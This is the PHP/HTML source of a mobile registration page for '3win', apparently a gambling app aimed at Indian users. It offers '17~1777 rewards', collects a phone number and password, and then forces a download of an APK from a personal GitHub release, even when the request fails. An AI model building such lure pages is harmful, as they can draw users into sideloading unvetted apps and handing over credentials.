<?php
session_start();
require_once 'config.php'; // Aapka config.php yahan load ho raha hai

// URL se invite code lena
$invite_code = isset($_GET['invite']) ? htmlspecialchars($_GET['invite']) : '';
$is_locked = !empty($invite_code) ? 'readonly' : '';
$locked_class = !empty($invite_code) ? 'locked-input' : '';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>3win - Register and Download</title>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
    body { 
        background-color: #2a0005; /* Dark Red Background */
        color: #fff; 
        min-height: 100vh; 
        max-width: 480px; 
        margin: 0 auto; 
        position: relative; 
        padding-bottom: 80px; /* Space for bottom button */
    }

    /* Header */
    .header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 12px 15px;
        background: #3b0008;
        position: sticky;
        top: 0;
        z-index: 100;
    }
    .logo-area {
        display: flex;
        align-items: center;
        gap: 8px;
        font-size: 20px;
        font-weight: bold;
    }
    .logo-area img { width: 30px; height: 30px; border-radius: 50%; }
    .header-icons { display: flex; gap: 12px; align-items: center; }
    .header-icons img { width: 24px; height: 24px; object-fit: contain; }

    /* Big Banner */
    .main-banner { width: 100%; display: block; }

    /* Progress Bar */
    .progress-container {
        padding: 20px 15px;
        background: linear-gradient(180deg, #1a0004, #2a0005);
    }
    .progress-bar {
        display: flex;
        justify-content: space-between;
        position: relative;
        margin-bottom: 10px;
        padding: 0 20px;
    }
    .progress-bar::before {
        content: ''; position: absolute; top: 50%; left: 30px; right: 30px;
        height: 2px; background: #5c1a22; transform: translateY(-50%); z-index: 1;
    }
    .step {
        width: 12px; height: 12px; border-radius: 50%; background: #5c1a22;
        position: relative; z-index: 2;
    }
    .step.active { background: #f3c37b; box-shadow: 0 0 8px #f3c37b; }
    .progress-labels {
        display: flex; justify-content: space-between;
        font-size: 11px; color: #888; text-align: center;
    }
    .progress-labels span.active { color: #f3c37b; }

    /* Form Area */
    .form-area { padding: 0 15px 20px 15px; }
    .input-box {
        display: flex; align-items: center;
        background: #1a0004;
        border: 1px solid #5c1a22;
        border-radius: 10px;
        padding: 12px 15px;
        margin-bottom: 15px;
        position: relative;
    }
    .input-box img { width: 20px; height: 20px; margin-right: 10px; }
    .country-code { color: #f3c37b; font-weight: bold; margin-right: 10px; border-right: 1px solid #5c1a22; padding-right: 10px; }
    .input-box input {
        flex: 1; background: transparent; border: none; outline: none;
        color: #fff; font-size: 15px; width: 100%;
    }
    .input-box input::placeholder { color: #666; }
    .locked-input { opacity: 0.6; pointer-events: none; }

    /* Eye Icon for Password */
    .eye-icon {
        position: absolute; right: 15px; width: 20px; height: 20px; cursor: pointer; opacity: 0.6;
    }

    .reward-text {
        font-size: 12px; color: #aaa; line-height: 1.5; margin-bottom: 20px; text-align: center;
    }
    .reward-text span { color: #f3c37b; font-weight: bold; }

    /* Sections (Advantages & Games) */
    .section-title {
        text-align: center; color: #f3c37b; font-size: 18px; font-weight: bold;
        margin: 20px 0 15px 0; position: relative;
    }
    .section-title::before, .section-title::after {
        content: ''; position: absolute; top: 50%; width: 25%; height: 1px; background: #5c1a22;
    }
    .section-title::before { left: 0; }
    .section-title::after { right: 0; }

    .full-width-img { width: 100%; display: block; margin-bottom: 20px; }

    /* Bottom Sticky Button */
    .bottom-bar {
        position: fixed; bottom: 0; left: 50%; transform: translateX(-50%);
        width: 100%; max-width: 480px; background: #1a0004;
        padding: 10px 15px; z-index: 1000; text-align: center;
    }
    .download-btn {
        width: 100%; max-width: 350px; cursor: pointer;
        transition: transform 0.1s;
    }
    .download-btn:active { transform: scale(0.95); }

    /* Custom Alert */
    .custom-alert {
        display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
        background: rgba(0,0,0,0.85); border: 1px solid #f3c37b; color: #fff;
        padding: 15px 20px; border-radius: 10px; font-size: 14px; text-align: center;
        z-index: 9999; width: 80%; max-width: 300px;
    }
    .custom-alert.show { display: block; animation: fadeIn 0.3s; }
    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

    /* Loader */
    .loader {
        display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
        background: rgba(0,0,0,0.7); z-index: 10000; justify-content: center; align-items: center;
    }
    .spinner {
        width: 40px; height: 40px; border: 4px solid #5c1a22; border-top: 4px solid #f3c37b;
        border-radius: 50%; animation: spin 1s linear infinite;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
</style>
</head>
<body>

<!-- Header -->
<div class="header">
    <div class="logo-area">
        <img src="https://i.ibb.co/s9L1M155/file-00000000ac6c8206970524e22b8f79f5.png" alt="Logo">
        3win
    </div>
    <div class="header-icons">
        <img src="https://i.ibb.co/xtyfj7s2/kefu.png" alt="Customer Service">
        <img src="https://i.ibb.co/s9JMnWTT/bangzhu.png" alt="Help">
        <img src="https://i.ibb.co/jvb9d220/yuyan.png" alt="Language">
    </div>
</div>

<!-- Big Banner -->
<img src="https://i.ibb.co/s9wgjBmk/918892048325677056-1.png" alt="17-1777 Reward" class="main-banner">

<!-- Progress Bar -->
<div class="progress-container">
    <div class="progress-bar">
        <div class="step active"></div>
        <div class="step"></div>
        <div class="step"></div>
    </div>
    <div class="progress-labels">
        <span class="active">Phone entered</span>
        <span>Confirm and download</span>
        <span>Claimed ₹200</span>
    </div>
</div>

<!-- Form Area -->
<div class="form-area">
    <form id="registerForm">
        <!-- Phone Input -->
        <div class="input-box">
            <img src="https://i.ibb.co/hFytkGcf/sj.png" alt="Phone">
            <span class="country-code">+91</span>
            <input type="tel" id="phone" name="phone" placeholder="Please enter your phone number" maxlength="10">
        </div>

        <!-- Password Input (NEW) -->
        <div class="input-box">
            <!-- Gold Lock Icon SVG -->
            <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23f3c37b'><path d='M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z'/></svg>" alt="Password">
            <input type="password" id="password" name="password" placeholder="Please enter your password">
            <!-- Eye Icon to toggle password visibility -->
            <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23ffffff'><path d='M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z'/></svg>" class="eye-icon" id="togglePassword" onclick="togglePass()">
        </div>

        <!-- Referral Input -->
        <div class="input-box <?php echo $locked_class; ?>">
            <img src="https://i.ibb.co/dwK4VsFP/rw.png" alt="Referral">
            <input type="text" id="invite" name="invite" placeholder="Please enter referral code" value="<?php echo $invite_code; ?>" <?php echo $is_locked; ?>>
        </div>

        <div class="reward-text">
            Please enter your mobile number and register to receive free <span>17~1777 rewards.</span>
        </div>
    </form>
</div>

<!-- Advantages Section -->
<div class="section-title">Our Advantages</div>
<img src="https://i.ibb.co/zTkmM1Hj/advantages.png" alt="Advantages" class="full-width-img" style="padding: 0 15px;">

<!-- Games Section -->
<div class="section-title" style="margin-top: 30px;">Register and enjoy all hot games</div>
<img src="https://i.ibb.co/pjsHGtBX/837635215837241344.png" alt="Games" class="full-width-img" style="padding: 0 15px;">

<!-- Bottom Sticky Button -->
<div class="bottom-bar">
    <img src="https://i.ibb.co/PGdz6DJQ/button.gif" alt="Register and Download" class="download-btn" onclick="processRegistration()">
</div>

<!-- Custom Alert -->
<div class="custom-alert" id="customAlert"></div>

<!-- Loader -->
<div class="loader" id="loader">
    <div class="spinner"></div>
</div>

<script>
// Toggle Password Visibility
function togglePass() {
    const passInput = document.getElementById('password');
    if (passInput.type === 'password') {
        passInput.type = 'text';
    } else {
        passInput.type = 'password';
    }
}

function showAlert(msg) {
    const alertBox = document.getElementById('customAlert');
    alertBox.innerText = msg;
    alertBox.classList.add('show');
    setTimeout(() => {
        alertBox.classList.remove('show');
    }, 3000);
}

function processRegistration() {
    const phone = document.getElementById('phone').value.trim();
    const password = document.getElementById('password').value.trim();
    const invite = document.getElementById('invite').value.trim();

    // Validation
    if (!phone || phone.length < 10) {
        showAlert("Please enter a valid 10-digit mobile number");
        return;
    }
    if (!password || password.length < 6) {
        showAlert("Please enter a valid password (min 6 characters)");
        return;
    }

    // Show Loader
    document.getElementById('loader').style.display = 'flex';

    // Prepare Data for config.php
    const formData = new FormData();
    formData.append('action', 'register');
    formData.append('phone', phone);
    formData.append('password', password); // User ka daala hua password
    formData.append('invite', invite);

    // Send AJAX Request
    fetch('config.php', { 
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        document.getElementById('loader').style.display = 'none';
        
        // Agar success ho ya pehle se register ho, dono case me APK download karwana hai
        if (data.success || data.message.includes('pehle se register')) {
            showAlert("Registration Successful! Downloading App...");
            setTimeout(() => {
                // Redirect to APK Download Link
                window.location.href = 'https://github.com/abhaypratapsingh76392-web/verbose-winner/releases/download/3win/3win.apk';
            }, 1500);
        } else {
            showAlert(data.message);
        }
    })
    .catch(error => {
        document.getElementById('loader').style.display = 'none';
        // Agar network error aaye tab bhi download start karwa do
        showAlert("Downloading App...");
        setTimeout(() => {
            window.location.href = 'https://github.com/abhaypratapsingh76392-web/verbose-winner/releases/download/3win/3win.apk';
        }, 1500);
    });
}
</script>

</body>
</html>